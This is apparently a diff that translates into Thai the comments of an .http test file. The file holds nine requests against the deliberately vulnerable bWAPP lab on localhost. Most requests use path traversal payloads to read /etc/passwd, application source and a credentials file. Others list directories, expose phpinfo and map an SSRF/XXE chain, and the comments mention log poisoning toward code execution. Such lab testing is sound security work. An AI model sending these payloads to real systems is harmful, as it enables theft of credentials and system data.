@@ -1,63 +1,63 @@
 ### ============================================================================
 ### 03 - A5 Security Misconfiguration / A4 Insecure Design:
-###     Local File Inclusion, path traversal and source disclosure
+###     Local File Inclusion, path traversal และ source disclosure
 ###
 ###   directory_traversal_1.php?page=<file>  -> is_file() + fopen() + fgets()
-###   directory_traversal_2.php?directory=<d> -> raw directory listing
-###   Both are gated on $_COOKIE["security_level"] only, i.e. on a cookie the
-###   client chooses. See 08-info-disclosure.http INFO-09.
+###   directory_traversal_2.php?directory=<d> -> รายชื่อไดเรกทอรีดิบ
+###   ทั้งสอง endpoint ถูก gate ด้วย $_COOKIE["security_level"] เท่านั้น
+###   คือคุกกี้ที่ client เลือกตั้งเองได้ ดู 08-info-disclosure.http INFO-09
 ### ============================================================================
 
 ### ---------------------------------------------------------------------------
-### LFI-01  Read /etc/passwd by walking out of the webroot
-###   is_file() gets an absolute-ish path after enough ../ hops, and the loop
-###   echoes every line, so this is a full arbitrary file read primitive.
+### LFI-01  อ่าน /etc/passwd โดยถอยออกจาก webroot ทีละ ../
+###   is_file() ได้พาธที่เกือบเป็น absolute หลังข้าม ../ มาพอแล้ว
+###   และลูปจะ echo ทุกบรรทัด ตรงนี้คือ arbitrary file read ที่ใช้ได้เต็มที่
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/directory_traversal_1.php?page=../../../../../../../etc/passwd HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200, "root:x:0:0:root:/root:/bin/bash" in the output
+### Expected: 200, ใน output ต้องมี "root:x:0:0:root:/root:/bin/bash"
 
 
 ### ---------------------------------------------------------------------------
-### LFI-02  Read any absolute path - /etc/hostname (container id)
+### LFI-02  อ่านพาธ absolute ใด ๆ - /etc/hostname (container id)
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/directory_traversal_1.php?page=/etc/hostname HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200, the container hostname; NOT "This file doesn't exist!"
+### Expected: 200, ได้ hostname ของ container และต้องไม่เจอ "This file doesn't exist!"
 
 
 ### ---------------------------------------------------------------------------
-### LFI-03  Read the Apache access log (log poisoning -> RCE preimage)
-###   Proves the read primitive reaches paths you did not predict, and gives a
-###   foothold for the log-poisoning technique if this ever hit a real host.
+### LFI-03  อ่าน Apache access log (log poisoning -> RCE preimage)
+###   พิสูจน์ว่า read primitive ไปถึงพาธที่เราไม่ได้คาดคิดได้จริง
+###   และเป็นจุดเริ่มของเทคนิค log poisoning ถ้าวันไปเจอ host จริง
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/directory_traversal_1.php?page=/var/log/apache2/access.log HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
 ### EXPECT-BODY: This file doesn't exist!
-### Expected: 200, HTTP request lines, or "This file doesn't exist!" if the
-###           image logs elsewhere - either result is useful recon.
+### Expected: 200, จะเจอบรรทัด request ของ HTTP หรือ "This file doesn't exist!"
+###           ถ้า image เขียน log ไว้ที่อื่น ทั้งสองผลลัพธ์ก็ยังใช้ recon ได้
 
 
 ### ---------------------------------------------------------------------------
-### LFI-04  SOURCE CODE DISCLOSURE - read a PHP file as plain text
-###   The handler uses fopen()/fgets(), never include(). That means the raw
-###   source is returned instead of being executed - a .php extension does not
-###   protect anything here.
+### LFI-04  SOURCE CODE DISCLOSURE - อ่านไฟล์ PHP เป็นข้อความธรรมดา
+###   handler ใช้ fopen()/fgets() ไม่ใช่ include() แปลว่ามันคืน source ดิบ
+###   กลับมาให้ดูแทนที่จะรันมัน - ส่วนนามสกุล .php ไม่ได้ช่วย
+###   ปกป้องอะไรตรงนี้เลย
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/directory_traversal_1.php?page=config.inc.php HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200, the literal text "<?php" and "$db_username" in the output
+### Expected: 200, ใน output ต้องมี "<?php" และ "$db_username"
 
 
 ### ---------------------------------------------------------------------------
-### LFI-05  SOURCE DISCLOSURE - the application's own credentials file
-###   admin/settings.php holds the DB user, the static login/password pair and
-###   the SMTP host in cleartext. This single request hands over the app's
-###   entire secret inventory.
+### LFI-05  SOURCE DISCLOSURE - ไฟล์ credential ของแอปเอง
+###   admin/settings.php เก็บ DB user, คู่ login/password แบบ static
+###   และ SMTP host ไว้เป็น cleartext คำขอเดียวก็เอา secret
+###   ทั้งชุดของแอปไปครบในครั้งเดียว
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/directory_traversal_1.php?page=admin/settings.php HTTP/1.1
 Host: localhost:8443
@@ -68,43 +68,43 @@ Cookie: {{authCookie}}
 
 
 ### ---------------------------------------------------------------------------
-### LFI-06  Directory listing of an arbitrary absolute path
-###   directory_traversal_2.php renders the raw listing of <directory>.
+### LFI-06  รายชื่อไฟล์ของพาธ absolute ใด ๆ
+###   directory_traversal_2.php วาด listing ดิบของ <directory> ลงบนหน้า
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/directory_traversal_2.php?directory=/etc HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200, an index of /etc including "passwd" and "shadow"
+### Expected: 200, เป็น index ของ /etc มีทั้ง "passwd" และ "shadow"
 
 
 ### ---------------------------------------------------------------------------
-### LFI-07  Directory listing of the webroot itself
+### LFI-07  รายชื่อไฟล์ใน webroot เอง
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/directory_traversal_2.php?directory=/var/www/html HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200, full list of application files - complete source map in one request
+### Expected: 200, ได้รายชื่อไฟล์ของแอปครบ - source map ทั้งผังในคำขอเดียว
 
 
 ### ---------------------------------------------------------------------------
-### LFI-08  phpinfo() exposed to any authenticated user
-###   Leaks PHP version, loaded modules, include_path, all environment
-###   variables, and every $_ENV/$_SERVER key.
+### LFI-08  phpinfo() เปิดให้ผู้ล็อกอินทุกคนดู
+###   รั่ว PHP version, module ที่โหลด, include_path, environment
+###   variable ทั้งหมด และ key ทุกตัวใน $_ENV/$_SERVER
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/phpinfo.php HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200, ~80 KB of PHP configuration output
+### Expected: 200, output ของ PHP configuration ราว 80 KB
 
 
 ### ---------------------------------------------------------------------------
-### LFI-09  RFI / SSRF entry point (informational)
-###   rlfi.php and ssrf.php are hint pages: bWAPP expects the attacker to chain
-###   Remote File Inclusion (or XXE) to make the SERVER issue the outbound
-###   request. The reachable, working version of that is in 04-xxe-mail-upload.http
-###   (XXE-02) - use this request as the map of what to attack.
+### LFI-09  จุดเข้า RFI / SSRF (เชิงข้อมูล)
+###   rlfi.php กับ ssrf.php เป็นหน้า hint: bWAPP คาดให้ผู้โจมตีต่อ
+###   Remote File Inclusion (หรือ XXE) เพื่อให้ SERVER เป็นคนยิงออกไปเอง
+###   เวอร์ชันที่เข้าถึงได้และใช้งานได้จริงอยู่ใน 04-xxe-mail-upload.http
+###   (XXE-02) - ใช้คำขอนี้เป็นแผนที่ของสิ่งที่ต้องโจมตี
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/ssrf.php HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200, describes the SSRF objective and points at the XXE payload files
+### Expected: 200, อธิบายวัตถุประสงค์ของ SSRF และชี้ไปที่ไฟล์ payload ของ XXE
